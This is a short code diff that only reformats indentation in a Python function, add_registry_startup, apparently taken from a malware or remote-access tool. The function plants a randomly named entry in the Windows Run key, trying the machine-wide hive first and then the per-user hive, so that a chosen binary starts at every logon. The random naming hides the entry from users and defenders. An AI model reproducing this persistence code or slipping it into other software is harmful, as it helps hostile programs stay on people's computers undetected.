@@ -18,18 +18,18 @@ import random
 import string
 
 def add_registry_startup(bin_path):
-	randname=''.join([random.choice(string.ascii_lowercase) for i in range(0,random.randint(6,12))])
-	try:
-		aKey = OpenKey(HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", 0, KEY_WRITE)
-		try:
-			SetValueEx(aKey, randname, 0, REG_SZ, bin_path)
-		finally:
-			CloseKey(aKey)
-	except Exception:
-		aKey2 = OpenKey(HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", 0, KEY_WRITE)
-		try:
-			SetValueEx(aKey2, randname, 0, REG_SZ, bin_path)
-		finally:
-			CloseKey(aKey2)
+    randname=''.join([random.choice(string.ascii_lowercase) for i in range(0,random.randint(6,12))])
+    try:
+        aKey = OpenKey(HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", 0, KEY_WRITE)
+        try:
+            SetValueEx(aKey, randname, 0, REG_SZ, bin_path)
+        finally:
+            CloseKey(aKey)
+    except Exception:
+        aKey2 = OpenKey(HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", 0, KEY_WRITE)
+        try:
+            SetValueEx(aKey2, randname, 0, REG_SZ, bin_path)
+        finally:
+            CloseKey(aKey2)
 
 
